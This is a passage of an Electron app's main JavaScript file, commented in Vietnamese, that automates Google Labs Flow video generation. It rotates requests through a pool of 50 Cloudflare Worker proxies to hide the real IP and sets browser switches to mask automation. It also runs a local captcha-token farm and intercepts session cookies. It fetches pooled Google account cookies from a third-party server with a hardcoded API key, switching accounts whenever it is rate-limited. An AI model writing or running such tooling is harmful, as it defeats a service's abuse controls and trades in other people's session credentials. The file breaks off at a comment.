"use strict";
const he = require("electron"),
  ye = require("path"),
  be = require("fs"),
  Jc = require("constants"),
  Ht = require("stream"),
  Vr = require("util"),
  Al = require("assert"),
  Nt = require("child_process"),
  Ro = require("events"),
  _r = require("crypto"),
  Sl = require("tty"),
  Ar = require("os"),
  Gt = require("url"),
  Qc = require("string_decoder"),
  Tl = require("zlib"),
  Zc = require("http");

// === Web Console Logger (http://localhost:9898/log) ===
const { handleLogRequest, LOG_PORT, attachToElectron, setClearCookieHandler } = require('./web-logger');
attachToElectron(he.app, he.ipcMain);

// === Local Proxy Server for Extension (127.0.0.1:3010) ===
const { createLocalProxyServer, LOCAL_PROXY_PORT } = require('./local-proxy-server');

// === Proxy qua Cloudflare Worker pool (trực tiếp — KHÔNG cần proxy-server.js) ===
// Request tới PROXY_HOSTS đi qua 1 worker: <worker-url>?url=<encodeURIComponent(target)>
const CF_WORKERS = [
  // Account 1: vipsphi
  "https://proxy-01.vipsphi.workers.dev",
  "https://proxy-02.vipsphi.workers.dev",
  "https://proxy-03.vipsphi.workers.dev",
  "https://proxy-04.vipsphi.workers.dev",
  "https://proxy-05.vipsphi.workers.dev",
  "https://proxy-06.vipsphi.workers.dev",
  "https://proxy-07.vipsphi.workers.dev",
  "https://proxy-08.vipsphi.workers.dev",
  "https://proxy-09.vipsphi.workers.dev",
  "https://proxy-10.vipsphi.workers.dev",
  // Account 2: qtcland2018
  "https://proxy-01.qtcland2018.workers.dev",
  "https://proxy-02.qtcland2018.workers.dev",
  "https://proxy-03.qtcland2018.workers.dev",
  "https://proxy-04.qtcland2018.workers.dev",
  "https://proxy-05.qtcland2018.workers.dev",
  "https://proxy-06.qtcland2018.workers.dev",
  "https://proxy-07.qtcland2018.workers.dev",
  "https://proxy-08.qtcland2018.workers.dev",
  "https://proxy-09.qtcland2018.workers.dev",
  "https://proxy-10.qtcland2018.workers.dev",
  // Account 3: huynhchieu0163
  "https://proxy-01.huynhchieu0163.workers.dev",
  "https://proxy-02.huynhchieu0163.workers.dev",
  "https://proxy-03.huynhchieu0163.workers.dev",
  "https://proxy-04.huynhchieu0163.workers.dev",
  "https://proxy-05.huynhchieu0163.workers.dev",
  "https://proxy-06.huynhchieu0163.workers.dev",
  "https://proxy-07.huynhchieu0163.workers.dev",
  "https://proxy-08.huynhchieu0163.workers.dev",
  "https://proxy-09.huynhchieu0163.workers.dev",
  "https://proxy-10.huynhchieu0163.workers.dev",
  // Account 4: acc4proxy
  "https://proxy-01.acc4proxy.workers.dev",
  "https://proxy-02.acc4proxy.workers.dev",
  "https://proxy-03.acc4proxy.workers.dev",
  "https://proxy-04.acc4proxy.workers.dev",
  "https://proxy-05.acc4proxy.workers.dev",
  "https://proxy-06.acc4proxy.workers.dev",
  "https://proxy-07.acc4proxy.workers.dev",
  "https://proxy-08.acc4proxy.workers.dev",
  "https://proxy-09.acc4proxy.workers.dev",
  "https://proxy-10.acc4proxy.workers.dev",
  // Account 5: acc5proxy
  "https://proxy-01.acc5proxy.workers.dev",
  "https://proxy-02.acc5proxy.workers.dev",
  "https://proxy-03.acc5proxy.workers.dev",
  "https://proxy-04.acc5proxy.workers.dev",
  "https://proxy-05.acc5proxy.workers.dev",
  "https://proxy-06.acc5proxy.workers.dev",
  "https://proxy-07.acc5proxy.workers.dev",
  "https://proxy-08.acc5proxy.workers.dev",
  "https://proxy-09.acc5proxy.workers.dev",
  "https://proxy-10.acc5proxy.workers.dev",
];
// ponytail: 5 account × 10 workers = 50 workers. Nếu redeploy, sửa list này.
const PROXY_LABEL = "cf-workers pool(50, 5 acc)";
const PROXY_HOSTS = [
  // "aisandbox-pa.googleapis.com", // Đã tắt aisandbox-pa.googleapis.com, chỉ dùng Flow API
  "labs.google",
  "generativelanguage.googleapis.com",
  "aiplatform.googleapis.com",
];
const PROXY_STICKY_MS = 5 * 60 * 1000; // (không dùng nữa — xem pickProxyWorker)
let proxyOk = null; // null=chưa test, true/false
let proxyRR = 0;

function shouldUseProxy(url) {
  try {
    const h = new URL(url).hostname;
    const hit = PROXY_HOSTS.some((d) => h === d || h.endsWith("." + d));
    console.log(`[Proxy] ${hit ? "→ VIA " + PROXY_LABEL : "→ DIRECT"} ${h}`);
    return hit;
  } catch {
    return false;
  }
}

// Round-robin MỖI request → nhiều luồng song song tự phân tán trên 10 worker.
// (Bỏ sticky 5 phút cũ: sticky gộp mọi luồng vào 1 worker nên đa luồng chỉ thấy 1 IP.)
// Fail -> lần retry kế tiếp tự lấy worker kế tiếp.
function pickProxyWorker() {
  return CF_WORKERS[proxyRR++ % CF_WORKERS.length];
}

// Gọi target qua 1 worker: giữ nguyên method/body/headers.
// redirect:"manual" để KHÔNG follow Location trực tiếp (follow = đi thẳng ra target = lộ IP thật).
// Worker fail (network/5xx) -> xoay worker khác, tối đa 3 lần.
// ponytail: body phải là string/Buffer (retry gửi lại được) — stream body thì không retry
async function proxyFetch(url, opts = {}) {
  if (!shouldUseProxy(url)) return fetch(url, opts);
  const enc = encodeURIComponent(url);
  let lastErr = null;
  for (let attempt = 1; attempt <= 3; attempt++) {
    const w = pickProxyWorker();
    try {
      const r = await fetch(`${w}?url=${enc}`, { ...opts, redirect: "manual" });
      console.log(`[Proxy] ${w.replace("https://", "")} -> ${new URL(url).pathname} -> ${r.status}`);
      if (r.status >= 500 && attempt < 3) {
        lastErr = new Error(`worker status ${r.status}`);
        continue;
      }
      return r;
    } catch (e) {
      lastErr = e;
      console.warn(`[Proxy] attempt ${attempt}/3 via ${w} fail: ${e.message}`);
    }
  }
  throw lastErr || new Error("proxy failed");
}

// Test worker pool 1 lần khi khởi động (không block)
async function testWorkerPool() {
  try {
    const r = await proxyFetch("https://httpbin.org/ip");
    const j = await r.json();
    proxyOk = true;
    console.log(`[Proxy] ✅ cf-workers OK (${r.status}) — egress=${j.origin}`);
  } catch (e) {
    proxyOk = false;
    console.error(`[Proxy] ❌ cf-workers FAIL — ${e.name}: ${e.message} (kiểm tra workers đã deploy chưa)`);
  }
}
testWorkerPool(); // fire-and-forget

// Ẩn cảnh báo automation của Google
he.app.commandLine.appendSwitch('--disable-blink-features', 'AutomationControlled');
he.app.commandLine.appendSwitch('--disable-automation');
he.app.commandLine.appendSwitch('--disable-features', 'site-per-process');

// === Kinxts (VieNeu-TTS) bridge ===
try { require("./kinxts-bridge").register(); } catch (e) { console.error("[Kinxts] init error:", e); }

// === Helper functions for account automation ===
function extractJwtExp(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return 0;
    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
    return payload.exp ? payload.exp * 1000 : 0;
  } catch (e) {
    return 0;
  }
}

function setupNetworkInterceptor(session, onCapture) {
  const filterUrls = ['*://labs.google/*', '*://*.google.com/*' /*, '*://aisandbox-pa.googleapis.com/*' */];
  const handler = (details, callback) => {
    const headers = details.requestHeaders;
    let cookieHeader = headers.Cookie || headers.cookie;
    let authHeader = headers.Authorization || headers.authorization;
    if (cookieHeader && details.url.includes('labs.google')) {
      onCapture({ type: 'cookie', value: cookieHeader });
    }
    /* [ĐÃ TẮT aisandbox-pa.googleapis.com - CHỈ DÙNG FLOW API]
    if (authHeader && details.url.includes('aisandbox-pa.googleapis.com')) {
      const expiry = extractJwtExp(authHeader);
      onCapture({ type: 'bearer', value: authHeader, expiry });
    }
    */
    callback({ requestHeaders: headers });
  };
  session.webRequest.onBeforeSendHeaders({ urls: filterUrls }, handler);
  return () => {
    try {
      session.webRequest.onBeforeSendHeaders({ urls: filterUrls }, null);
    } catch (e) { }
  };
}

function createAccountProfile(email) {
  // Generate deterministic profile ID from email
  const profileId = 'acc-' + require('crypto').createHash('md5').update(email).digest('hex').substring(0, 8);
  const partition = `persist:${profileId}`;
  const session = he.session.fromPartition(partition);
  return { profileId, partition, session };
}

function cleanProfileDeep(profileId) {
  const session = he.session.fromPartition(`persist:${profileId}`);
  return Promise.all([
    session.clearStorageData(),
    session.clearCache()
  ]);
}

// ============================================================================
// --- TÍCH HỢP LOCAL CAPTCHA SOLVER SERVER TRỰC TIẾP ---
// ============================================================================
const express = require("express");
const { Server: SocketServer } = require("socket.io");
const http = require("http");
const crypto = require("crypto");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
// puppeteer.use(StealthPlugin()); // Tạm tắt StealthPlugin vì plugin này có thể làm ẩn các thành phần của extension

(function startLocalSolver() {
  const app = express();
  app.use((req, res, next) => {
    if (req.path === '/log' || req.path.startsWith('/log/')) {
      return handleLogRequest(req, res);
    }
    next();
  });
  const server = http.createServer(app);
  const io = new SocketServer(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
  });

  const PORT = 3000;
  const workers = new Map();
  const pendingRequests = new Map();

  io.on('connection', (socket) => {
    console.log(`[Main] Có kết nối Socket mới: ${socket.id}. Đang chờ signal client:ready...`);

    socket.on('client:ready', (data) => {
      console.log(`[Main] Worker đã SẴN SÀNG: ${socket.id}`);
      workers.set(socket.id, { id: socket.id, busy: false });
      console.log(`[Main] Tổng số Worker hiện có: ${workers.size}`);
    });

    socket.on('client:captcha-solved', (data) => {
      if (pendingRequests.has(data.requestId)) {
        const { resolve, timer } = pendingRequests.get(data.requestId);
        clearTimeout(timer);
        pendingRequests.delete(data.requestId);
        resolve(data.token);
      }
    });

    socket.on('client:captcha-error', (data) => {
      if (pendingRequests.has(data.requestId)) {
        const { reject, timer } = pendingRequests.get(data.requestId);
        clearTimeout(timer);
        pendingRequests.delete(data.requestId);
        reject(new Error(data.error));
      }
    });

    socket.on('disconnect', () => {
      console.log(`[Main] Worker đã thoát: ${socket.id}`);
      workers.delete(socket.id);
    });
  });

  let lastCaptchaTime = 0;
  let captchaMutex = Promise.resolve();

  app.get('/captcha', async (req, res) => {
    const action = req.query.action || 'VIDEO_GENERATION';
    try {
      he.BrowserWindow.getAllWindows().forEach((win) => {
        if (!win.isDestroyed()) win.webContents.send("captcha:requested", { action, time: Date.now() });
      });
    } catch (_) { }

    // Thao tác tuần tự hóa (lock) để tránh gửi dồn dập Captcha cho Client giải
    const currentLock = captchaMutex;
    let resolveLock;
    captchaMutex = new Promise(resolve => {
      resolveLock = resolve;
    });

    try {
      await currentLock;

      const now = Date.now();
      const timeDiff = now - lastCaptchaTime;
      const delay = Math.max(0, 5000 - timeDiff);
      if (delay > 0) {
        console.log(`[Main] [Rate Limit Captcha] Chờ ${Math.ceil(delay / 1000)}s trước khi gửi yêu cầu giải tiếp theo...`);
        await new Promise(r => setTimeout(r, delay));
      }
      lastCaptchaTime = Date.now();

      const workerIds = Array.from(workers.keys());
      if (workerIds.length === 0) {
        console.log("[Main] Lỗi: Không có Worker nào sẵn sàng để giải captcha.");
        return res.status(503).json({ error: 'No workers available' });
      }

      const workerId = workerIds[Math.floor(Math.random() * workerIds.length)];
      const requestId = crypto.randomUUID();

      const token = await new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
          if (pendingRequests.has(requestId)) {
            pendingRequests.delete(requestId);
            console.log("[Main] ❌ Yêu cầu giải captcha bị quá hạn (Timeout 120s):", requestId);
            reject(new Error('Timeout'));
          }
        }, 120000); // [429-fix] 60s -> 120s: worker giải lâu vẫn đợi được, tránh trả 500 khi token sắp ra
        pendingRequests.set(requestId, { resolve, reject, timer });
        console.log("[Main] 📤 Đang yêu cầu Worker giải captcha:", requestId);
        io.to(workerId).emit('server:request-captcha', { requestId, action });
      });
      console.log("[Main] ✅ Đã nhận được Token cho request:", requestId);
      res.json({ captcha: token });
    } catch (e) {
      res.status(500).json({ error: e.message });
    } finally {
      resolveLock();
    }
  });

  server.on('error', (e) => {
    if (e.code === 'EADDRINUSE') {
      console.log(`[Main] Port ${PORT} đã được sử dụng (có thể do phiên bản cũ đang chạy).`);
    }
  });

  server.listen(PORT, '127.0.0.1', () => {
    console.log(`[Main] Local Solver Server is running on http://127.0.0.1:${PORT}`);
    console.log(`[Main] Vui lòng mở trình duyệt và truy cập https://labs.google/fx/tools/flow để kích hoạt worker.`);
  });

  he.ipcMain.on('app:open-external', (event, url) => {
    he.shell.openExternal(url);
  });

  he.ipcMain.handle('extension:check-status', () => {
    console.log(`[Main] Kiểm tra trạng thái Extension: ${workers.size} worker đang kết nối.`);
    return {
      workerCount: workers.size,
      port: PORT
    };
  });

})();

// ============================================================================
// --- OAUTH SERVER FOR GOOGLE LOGIN (Avoid Windows Security Popup) ---
// ============================================================================
(function startOAuthServer() {
  const oauthApp = require('express')();
  const oauthServer = require('http').createServer(oauthApp);
  const OAUTH_PORT = 3001;
  const oauthPending = new Map(); // state -> { resolve, reject, timeout }

  oauthApp.get('/oauth-callback', (req, res) => {
    const { state, code, error } = req.query;
    const pending = oauthPending.get(state);
    if (!pending) {
      res.status(400).send('Invalid state');
      return;
    }
    oauthPending.delete(state);
    clearTimeout(pending.timeout);
    if (error) {
      pending.reject(new Error(`OAuth error: ${error}`));
      res.send('<script>window.close();</script>');
      return;
    }
    pending.resolve(code);
    res.send('<script>window.close();</script>');
  });

  oauthServer.on('error', (e) => {
    if (e.code === 'EADDRINUSE') {
      console.log(`[OAuth] Port ${OAUTH_PORT} already in use, OAuth server not started.`);
    }
  });

  oauthServer.listen(OAUTH_PORT, '127.0.0.1', () => {
    console.log(`[OAuth] OAuth callback server listening on http://127.0.0.1:${OAUTH_PORT}`);
  });

  // IPC handler to start OAuth flow
  he.ipcMain.handle('auth:start-oauth', async (event, { provider = 'google', scopes = [] }) => {
    const state = require('crypto').randomBytes(16).toString('hex');
    const redirectUri = `http://127.0.0.1:${OAUTH_PORT}/oauth-callback`;
    let authUrl;
    if (provider === 'google') {
      const scopeStr = scopes.length ? scopes.join(' ') : 'openid email profile';
      authUrl = `https://accounts.google.com/o/oauth2/v2/auth?` +
        `client_id=${encodeURIComponent('YOUR_CLIENT_ID')}` +
        `&redirect_uri=${encodeURIComponent(redirectUri)}` +
        `&response_type=code` +
        `&scope=${encodeURIComponent(scopeStr)}` +
        `&state=${state}` +
        `&access_type=offline` +
        `&prompt=consent`;
    } else {
      throw new Error(`Unsupported provider: ${provider}`);
    }
    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        oauthPending.delete(state);
        reject(new Error('OAuth timeout'));
      }, 300000); // 5 minutes
      oauthPending.set(state, { resolve, reject, timeout });
      he.shell.openExternal(authUrl);
    }).then(async (code) => {
      // Exchange code for tokens (simplified)
      console.log(`[OAuth] Received authorization code: ${code}`);
      // Here you would make a server-side request to exchange code for tokens
      // For demo, return dummy token
      return { accessToken: 'dummy_access_token', refreshToken: 'dummy_refresh_token' };
    });
  });

  // Cleanup on exit
  he.app.on('before-quit', () => {
    oauthPending.forEach(pending => {
      clearTimeout(pending.timeout);
      pending.reject(new Error('App quitting'));
    });
    oauthPending.clear();
  });
})();
// ============================================================================
// --- TÍCH HỢP VOICE ENGINE (Edge TTS — 322+ voices) ---
// ============================================================================
const { registerVoiceIPC } = require('./voice-engine');
registerVoiceIPC();
// ============================================================================
// --- [BẮT ĐẦU] KHAI BÁO MODULE RECAPTCHA (Đã thêm cơ chế Xếp hàng) ---
// ============================================================================
const path = require("path");

const threadTokenCache = new Map(); // threadId -> { token, userAgent, expiry }
// ===== [FLOW RPC] flow.google.com batchexecute: tạo project (jHPbke), lấy UUID project (UpteDb), lấy link media (as29s) =====
// Thay thế cho:
//   - https://labs.google/fx/api/trpc/project.createProject
//   - https://labs.google/fx/api/trpc/media.getMediaUrlRedirect?name=
// Cookie dùng cho flow.google.com: dùng chung cookie lấy từ https://tainguyenweb.com/apiveo/kinxcookie.php
// (ưu tiên cookie đang dùng trong pool; nếu không có thì gọi kinxcookie.php với X-API-Key + Bearer authToken).
const FLOW_CK_URL = "https://tainguyenweb.com/apiveo/kinxcookie.php";
const FLOW_API_KEY = "kinx@0$*2048";
const FLOW_ORIGIN = "https://flow.google.com";
const FLOW_RPC_PATH = "/_/AiSandboxAngularFrontend/data/batchexecute";
const FLOW_DEFAULT_BL = "boq_labs-ai-sandbox-frontend_20261021.00_p0";
const FLOW_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36";
const isFlowUuid = (s) => /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(String(s || "").trim());
const FLOW_UUID_RE = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/ig;
const flowCookieCache = new Map();  // authToken -> { ctx, expiry }
const flowSessionCache = new Map(); // authUser|cookie -> { at, bl, fsid, expiry }
let flowReqCounter = 100000 + Math.floor(Math.random() * 800000);
global.flowServerAuthToken = global.flowServerAuthToken || null;

// Handler xóa Cache Cookie khi người dùng bấm nút trên Web Logger (/log) - CHỈ xóa cookie, giữ nguyên dữ liệu tool
if (typeof setClearCookieHandler === "function") {
  setClearCookieHandler(async () => {
    const cleared = [];
    try {
      if (typeof threadTokenCache !== "undefined" && threadTokenCache && threadTokenCache.clear) {
        const s = threadTokenCache.size;
        threadTokenCache.clear();
        cleared.push(`threadTokenCache (${s})`);
      }
    } catch (_) { }

    try {
      if (typeof flowCookieCache !== "undefined" && flowCookieCache && flowCookieCache.clear) {
        const s = flowCookieCache.size;
        flowCookieCache.clear();
        cleared.push(`flowCookieCache (${s})`);
      }
    } catch (_) { }

    try {
      if (typeof flowSessionCache !== "undefined" && flowSessionCache && flowSessionCache.clear) {
        const s = flowSessionCache.size;
        flowSessionCache.clear();
        cleared.push(`flowSessionCache (${s})`);
      }
    } catch (_) { }

    try {
      if (Array.isArray(global.veoCookieCache) && global.veoCookieCache.length > 0) {
        const c = global.veoCookieCache.length;
        global.veoCookieCache = [];
        cleared.push(`global.veoCookieCache (${c} items)`);
      }
    } catch (_) { }

    try {
      if (global.flowSharedProjectMap && global.flowSharedProjectMap.clear) {
        global.flowSharedProjectMap.clear();
        cleared.push("flowSharedProjectMap");
      }
      if (global.uploadedImageCache && global.uploadedImageCache.clear) {
        global.uploadedImageCache.clear();
      }
      if (global.bananaFrontendUploadCache && global.bananaFrontendUploadCache.clear) {
        global.bananaFrontendUploadCache.clear();
      }
    } catch (_) { }

    try {
      if (he && he.session && he.session.defaultSession) {
        // CHỈ xóa cookies của trình duyệt, TUYỆT ĐỐI KHÔNG xóa localstorage / indexdb / dữ liệu của tool
        await he.session.defaultSession.clearStorageData({
          storages: ['cookies']
        });
        cleared.push('Electron defaultSession (chỉ xóa cookies)');
      }
    } catch (e) {
      console.error("[CacheCleaner] Lỗi clearStorageData cookies:", e);
    }

    console.log(`[CacheCleaner] 🧹 Đã xóa Cache Cookie (giữ nguyên dữ liệu tool): ${cleared.join(", ")}`);
    return {
      success: true,
      message: `Đã xóa sạch Cache Cookie (giữ nguyên dữ liệu tool): ${cleared.join(", ")}`,
      cleared
    };
  });
}

const flowFetch = (url, init = {}) => {
  const fetchFn = global.fetch || require("node-fetch");
  const sessionCtrl = global.currentAbortController;
  if (!sessionCtrl || sessionCtrl.signal.aborted) {
    return fetchFn(url, init);
  }
  const ctrl = new AbortController();
  const onAbort = () => { try { ctrl.abort(); } catch (_) { } };
  sessionCtrl.signal.addEventListener("abort", onAbort, { once: true });
  if (init && init.signal) {
    if (init.signal.aborted) {
      try { ctrl.abort(); } catch (_) { }
    } else {
      init.signal.addEventListener("abort", onAbort, { once: true });
    }
  }
  return fetchFn(url, { ...init, signal: ctrl.signal }).finally(() => {
    sessionCtrl.signal.removeEventListener("abort", onAbort);
  });
};
const flowSleep = (ms) => (typeof cancellableSleep === "function" ? cancellableSleep(ms) : new Promise((r) => setTimeout(r, ms)));

// Chuẩn hoá cookie trả về từ server (string | {value} | {cookie} | [{name,value}])
function normalizeFlowCookie(raw, extra = {}) {
  let value = "";
  let authUser = extra.authuser ?? extra.authUser ?? null;
  if (typeof raw === "string") value = raw;
  else if (Array.isArray(raw)) value = raw.filter((x) => x && x.name).map((x) => `${x.name}=${x.value}`).join("; ");
  else if (raw && typeof raw === "object") {
    const v = raw.value ?? raw.cookie ?? raw.cookies ?? "";
    value = Array.isArray(v) ? v.filter((x) => x && x.name).map((x) => `${x.name}=${x.value}`).join("; ") : String(v || "");
    authUser = raw.authuser ?? raw.authUser ?? authUser;
  }
  // Sửa cookie bị markdown làm hỏng (**Secure- -> __Secure-)
  value = value.replace(/\*\*(Secure|Host)-/g, "__$1-").trim();
  const bearerToken = (raw && typeof raw === "object" && !Array.isArray(raw) ? raw.bearerToken : null) || extra.bearerToken || null;
  return { value, authUser: authUser === "" || authUser === undefined ? null : authUser, bearerToken };
}

// URL kinxcookie.php theo lý do:
//   "" / "reload" -> ?reload : lấy lại cookie đang gắn cho user (bản đã được server làm mới)
//   "401" / "429" -> ?401 / ?429 : cookie đang gắn bị lỗi -> server cấp cookie KHÁC
function kinxCookieUrl(reason = "") {
  const r = String(reason || "").trim();
  if (r === "401" || r === "429") {
    flowCookieCache.clear(); // cookie sắp đổi tài khoản -> bỏ cache cũ
    return `${FLOW_CK_URL}?${r}`;
  }
  return `${FLOW_CK_URL}?reload`;
}

// Khoá định danh tài khoản Google: __Secure-1PSID (fallback SID) — KHÔNG đổi khi RotateCookies
function flowCookieAccountKey(v) {
  const s = String(v || "");
  const m = s.match(/(?:^|;\s*)__Secure-1PSID=([^;]+)/) || s.match(/(?:^|;\s*)SID=([^;]+)/);
  return m ? m[1].trim() : null;
}

// Ghi đè cookie đã làm mới vào 1 object cookie nếu cùng tài khoản. Trả về true nếu có thay đổi.
function flowApplyServerCookie(obj, serverCtx) {
  if (!obj || typeof obj !== "object" || !serverCtx || !serverCtx.value) return false;
  const field = typeof obj.value === "string" ? "value" : typeof obj.cookie === "string" ? "cookie" : null;
  if (!field) return false;
  const key = flowCookieAccountKey(serverCtx.value);
  const cur = normalizeFlowCookie(obj[field]).value;
  if (!key || flowCookieAccountKey(cur) !== key) return false;
  let changed = false;
  if (cur !== serverCtx.value) { obj[field] = serverCtx.value; changed = true; }
  if (serverCtx.bearerToken && "bearerToken" in obj && obj.bearerToken !== serverCtx.bearerToken) { obj.bearerToken = serverCtx.bearerToken; changed = true; }
  return changed;
}

// Đồng bộ cookie pool (global.veoCookieCache) với cookie mới nhất của server (cùng tài khoản)
function flowSyncPool(serverCtx) {
  const key = serverCtx && flowCookieAccountKey(serverCtx.value);
  if (!key) return 0;
  let n = 0;
  for (const item of Array.isArray(global.veoCookieCache) ? global.veoCookieCache : []) {
    if (!item || !item.cookie) continue;
    if (typeof item.cookie === "string") {
      const cur = normalizeFlowCookie(item.cookie).value;
      if (flowCookieAccountKey(cur) === key && cur !== serverCtx.value) { item.cookie = serverCtx.value; n++; }
    } else if (flowApplyServerCookie(item.cookie, serverCtx)) n++;
  }
  if (n) console.log(`[FlowRPC] Đã đồng bộ ${n} cookie trong pool với cookie đã làm mới từ server.`);
  return n;
}

// Kiểm tra xem object cookie có phải là Profile Local (managecookie) hay không
function isLocalProfileCookie(raw) {
  if (!raw || typeof raw !== "object") return false;
  if (raw.partition || String(raw.id || "").startsWith("prof-")) return true;
  if ("cooldownUntil" in raw || "autoRefresh" in raw || raw.status === "logged_in") return true;
  return false;
}

// ƯU TIÊN: Nếu caller truyền sẵn cookieHint (ví dụ cookie local hoặc cookie đang dùng trong pool) và không force thì dùng ngay cookieHint, không gọi server thừa.
async function flowResolveCookies(cookieHint, authToken, force = false, reason = "") {
  const hintCtx = cookieHint ? normalizeFlowCookie(cookieHint) : null;
  const hasValidHint = !!(hintCtx && hintCtx.value && hintCtx.value.trim().length > 10);
  const isLocalHint = isLocalProfileCookie(cookieHint);
  const list = [];

  if (!force && hasValidHint) {
    return [hintCtx];
  }

  // Nếu đang force làm mới một Cookie Local -> ưu tiên xoay trực tiếp qua RotateCookies cục bộ
  if (force && hasValidHint && isLocalHint && typeof global.flowRotateProfileCookie === "function") {
    try {
      const rot = await global.flowRotateProfileCookie(hintCtx.value);
      if (rot && rot.success && rot.cookie) {
        const rotatedCtx = normalizeFlowCookie(rot.cookie, { bearerToken: rot.bearerToken });
        if (rotatedCtx.value) list.push(rotatedCtx);
      }
    } catch (_) { }
  }

  // 1. Cookie server (bỏ qua nếu cookieHint là Profile Local hoặc server vừa trả 403 Forbidden)
  const serverForbidden = global.flowServerCookieForbiddenUntil && Date.now() < global.flowServerCookieForbiddenUntil;
  if (!isLocalHint && (!serverForbidden || reason === "401" || reason === "429")) {
    try {
      const serverCtx = await fetchFlowCookieFromServer(authToken, force, reason);
      if (serverCtx && serverCtx.value) {
        if (!list.some((x) => x.value === serverCtx.value)) {
          list.push(serverCtx);
        }
      }
    } catch (e) {
      if (!String(e.message || "").includes("HTTP 403")) {
        console.warn(`[FlowRPC] Không lấy được cookie server: ${e.message}`);
      }
    }
  }

  // 2. Cookie local: dự phòng khi server không trả cookie (hoặc xếp sau server khi force=true)
  if (hasValidHint) {
    if (!list.some((x) => x.value === hintCtx.value)) {
      list.push(hintCtx);
    }
  }

  if (list.length === 0) {
    console.warn(`[FlowRPC] Không lấy được cookie server và không có cookie local.`);
  }

  return list;
}

// Lấy cookie flow.google.com từ server kinxcookie.php?reload (cache 60 giây / authToken)
async function fetchFlowCookieFromServer(authToken, force = false, reason = "") {
  let token = String(authToken || global.flowServerAuthToken || "").trim();
  if (!token) throw new Error("Thiếu authToken để lấy cookie từ kinxcookie");
  token = token.replace(/^Bearer\s+/i, "");
  global.flowServerAuthToken = token;
  const cached = flowCookieCache.get(token);
  if (!force && !reason && cached && Date.now() < cached.expiry) return cached.ctx;

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 15000);
  try {
    const response = await flowFetch(kinxCookieUrl(reason), {
      headers: { "X-API-Key": FLOW_API_KEY, Authorization: `Bearer ${token}` },
      signal: controller.signal,
    });
    if (!response.ok) {
      if (response.status === 403) {
        global.flowServerCookieForbiddenUntil = Date.now() + 5 * 60 * 1000;
      }
      throw new Error(`HTTP ${response.status}`);
    }
    global.flowServerCookieForbiddenUntil = 0;
    const res = await response.json();
    if (!res || !res.success || !res.cookie) throw new Error((res && res.message) || "Server không trả về cookie Flow hợp lệ.");
    const ctx = normalizeFlowCookie(res.cookie, res);
    if (!ctx.value) throw new Error("Cookie Flow rỗng.");
    flowCookieCache.set(token, { ctx, expiry: Date.now() + 30 * 60 * 1000 }); // 30 phút gọi server xin cookie mới
    flowSyncPool(ctx);
    return ctx;
  } catch (err) {
    if (err.name === "AbortError") throw new Error("Timeout lấy cookie từ kinxcookie.php sau 15 giây");
    throw new Error(`Lỗi lấy cookie Flow: ${err.message}`);
  } finally {
    clearTimeout(timer);
  }
}

function flowUserPrefix(authUser) {
  return authUser !== null && authUser !== undefined && authUser !== "" ? `/u/${authUser}` : "";
}

// Lấy at (SNlM0e), bl (cfb2h), f.sid (FdrFJe) từ HTML flow.google.com (cache 5 phút)
async function getFlowSession(ctx, force = false) {
  const key = `${ctx.authUser ?? ""}|${ctx.value}`;
  const cached = flowSessionCache.get(key);
  if (!force && cached && Date.now() < cached.expiry) return cached;

  let at = null;
  let bl = FLOW_DEFAULT_BL;
  let fsid = String(Math.floor(Math.random() * 9e18));
  let htmlLen = 0;

  try {
    const html = await flowFetch(`${FLOW_ORIGIN}${flowUserPrefix(ctx.authUser)}/`, {
      headers: { cookie: ctx.value, "user-agent": FLOW_UA, accept: "text/html", "accept-language": "vi,en-US;q=0.8,en;q=0.7" },
    }).then((r) => r.text());
    htmlLen = html.length;
    at = (html.match(/"SNlM0e":"([^"]+)"/) || [])[1] || (html.match(/"SNlM0e":\s*"([^"]+)"/) || [])[1];
    const bMatch = (html.match(/"cfb2h":"([^"]+)"/) || [])[1];
    if (bMatch) bl = bMatch;
    const fMatch = (html.match(/"FdrFJe":"([^"]+)"/) || [])[1];
    if (fMatch) fsid = fMatch;
  } catch (e) { }

  if (!at && typeof global.flowRotateProfileCookie === "function") {
    try {
      console.log('[FlowSession] Chưa có SNlM0e, thử xoay RotateCookies (og_pid=749) để lấy OSID & at token...');
      const rot = await global.flowRotateProfileCookie(ctx.value);
      if (rot && rot.success && rot.cookie && rot.bearerToken && rot.bearerToken !== 'FLOW_SESSION') {
        ctx.value = rot.cookie;
        at = rot.bearerToken;
        const newKey = `${ctx.authUser ?? ""}|${ctx.value}`;
        const newSession = {
          at,
          bl: (rot.cookie.match(/"cfb2h":"([^"]+)"/) || [])[1] || bl,
          fsid,
          expiry: Date.now() + 5 * 60 * 1000,
        };
        flowSessionCache.set(newKey, newSession);
        console.log('[FlowSession] Tự động cấp OSID & SNlM0e thành công qua RotateCookies!');
        return newSession;
      }
    } catch (e) { }
  }

  // Dự phòng: chỉ khi !force và bearerToken có định dạng SNlM0e hợp lệ (chứa ':', không phải ya29.)
  if (!at && !force && ctx.bearerToken && ctx.bearerToken !== 'FLOW_SESSION' && String(ctx.bearerToken).includes(':') && !String(ctx.bearerToken).startsWith('ya29.')) {
    at = ctx.bearerToken;
    console.log('[FlowSession] HTML thiếu SNlM0e, sử dụng at token lưu sẵn từ profile: ' + at.slice(0, 18) + '...');
  }

  if (!at) {
    flowSessionCache.delete(key);
    if (typeof flowCookieCache !== "undefined" && flowCookieCache.clear) flowCookieCache.clear();
    global.lastValidKinxCookieResponse = null;
    const authErr = new Error(`401: Không tìm thấy at token (SNlM0e) trong flow.google.com (len ${htmlLen}). Cookie Flow hết hạn?`);
    authErr.statusCode = 401;
    authErr.status = 401;
    throw authErr;
  }

  const session = {
    at,
    bl,
    fsid,
    expiry: Date.now() + 5 * 60 * 1000,
  };
  flowSessionCache.set(key, session);
  return session;
}

// Gọi 1 RPC batchexecute, trả về payload đã JSON.parse của frame "wrb.fr"
